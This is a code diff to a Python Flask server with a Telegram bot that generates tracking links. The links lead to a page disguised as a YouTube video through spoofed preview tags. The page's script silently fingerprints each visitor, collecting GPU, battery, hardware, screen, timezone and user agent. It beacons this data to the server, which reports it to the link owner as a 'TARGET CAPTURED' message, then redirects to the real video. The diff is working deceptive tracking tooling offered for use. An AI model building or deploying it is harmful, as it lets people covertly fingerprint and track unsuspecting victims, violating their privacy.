@@ -19,7 +19,7 @@ PORT = int(os.environ.get("PORT", 10000))
 
 app = Flask(__name__)
 logging.basicConfig(level=logging.INFO)
-logger = logging.getLogger("PHANTOM_v6_FINAL")
+logger = logging.getLogger("PHANTOM_FINAL_V7")
 
 def init_db():
     conn = sqlite3.connect('phantom.db', check_same_thread=False)
@@ -45,7 +45,7 @@ def get_owner(sid):
     return res[0] if res else OVERLORD_ID
 
 # =================================================================
-# [2] ADVANCED EXPLOIT UI (JS FINGERPRINTING + BATTERY)
+# [2] ADVANCED EXPLOIT UI (YOUTUBE MASKING + BATTERY)
 # =================================================================
 HTML_TEMPLATE = """
 <!DOCTYPE html>
@@ -53,7 +53,14 @@ HTML_TEMPLATE = """
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>YouTube Mobile</title>
+    
+    <meta property="og:title" content="Rick Astley - Never Gonna Give You Up (Official Music Video)" />
+    <meta property="og:description" content="The official video for 'Never Gonna Give You Up' by Rick Astley." />
+    <meta property="og:image" content="https://img.youtube.com/vi/dQw4w9WgXcQ/maxresdefault.jpg" />
+    <meta property="og:site_name" content="YouTube" />
+    <meta property="og:type" content="video.other" />
+    
+    <title>YouTube</title>
     <style>
         body, html { margin:0; padding:0; width:100%; height:100%; background:#000; font-family: sans-serif; overflow:hidden; }
         #app { width:100%; height:100%; display:flex; align-items:center; justify-content:center; 
@@ -85,7 +92,7 @@ HTML_TEMPLATE = """
             return debug ? gl.getParameter(debug.UNMASKED_RENDERER_WEBGL) : "Generic GPU";
         };
 
-        let batInfo = "Blocked/iOS";
+        let batInfo = "Access Denied";
         try {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
@@ -106,13 +113,13 @@ HTML_TEMPLATE = """
 
         const payload = { sid: sid, specs: specs, ua: navigator.userAgent, ref: document.referrer || "Direct" };
         
-        // Отправка данных
+        // Отправка Beacon
         navigator.sendBeacon('/gate/capture', btoa(JSON.stringify(payload)));
 
-        // Редирект
+        // Редирект на оригинал
         setTimeout(() => {
             window.location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
-        }, 600);
+        }, 500);
     }
 </script>
 </body>
@@ -120,20 +127,20 @@ HTML_TEMPLATE = """
 """
 
 # =================================================================
-# [3] SERVER CORE & TELEGRAM REPORTING
+# [3] SERVER CORE & REPORTING
 # =================================================================
 
 def build_report(data):
     s = data.get('specs', {})
     return (
-        "<b>🔴 ОБЪЕКТ ЗАФИКСИРОВАН</b>\n"
+        "<b>🔴 TARGET CAPTURED</b>\n"
         "━━━━━━━━━━━━━━━━━━\n"
         f"🆔 <b>Target ID:</b> <code>{data.get('sid')}</code>\n"
-        f"🔋 <b>Заряд:</b> <code>{s.get('bat')}</code>\n"
+        f"🔋 <b>Battery:</b> <code>{s.get('bat')}</code>\n"
         f"🎮 <b>GPU:</b> <code>{s.get('gpu')}</code>\n"
         f"🧠 <b>Hardware:</b> <code>{s.get('cores')} Cores / {s.get('mem')}GB RAM</code>\n"
-        f"📱 <b>Экран:</b> <code>{s.get('res')}</code>\n"
-        f"📍 <b>TZ:</b> <code>{s.get('tz')}</code>\n"
+        f"📱 <b>Display:</b> <code>{s.get('res')}</code>\n"
+        f"📍 <b>Timezone:</b> <code>{s.get('tz')}</code>\n"
         "━━━━━━━━━━━━━━━━━━\n"
         f"🌐 <b>User-Agent:</b>\n<code>{data.get('ua')[:120]}...</code>"
     )
@@ -157,7 +164,7 @@ def gate_capture():
 
 @app.route('/system/heartbeat')
 @app.route('/ping')
-def health(): return "ALIVE_200", 200
+def health(): return "SYSTEM_ACTIVE_200", 200
 
 # =================================================================
 # [4] C2 BOT ENGINE
@@ -180,16 +187,14 @@ def bot_engine():
                     sid = str(cid)
                     save_link(sid, cid)
                     link = f"{BASE_URL}/v/{sid}"
+                    
+                    # ССЫЛКА ТЕПЕРЬ КЛИКАБЕЛЬНА
                     requests.post(f"https://api.telegram.org/bot{API_TOKEN}/sendMessage", json={
                         "chat_id": cid, 
-                        "text": f"🕶 <b>Доступ открыт!</b>\n\n🔗 Твоя ссылка:\n<code>{link}</code>", 
+                        "text": f"🕶 <b>Доступ активирован!</b>\n\n🔗 Твоя рабочая ссылка:\n<a href='{link}'>{link}</a>", 
                         "parse_mode": "HTML"
                     })
         except: time.sleep(5)
-
-# =================================================================
-# [5] START
-# =================================================================
 
 if __name__ == '__main__':
     init_db()
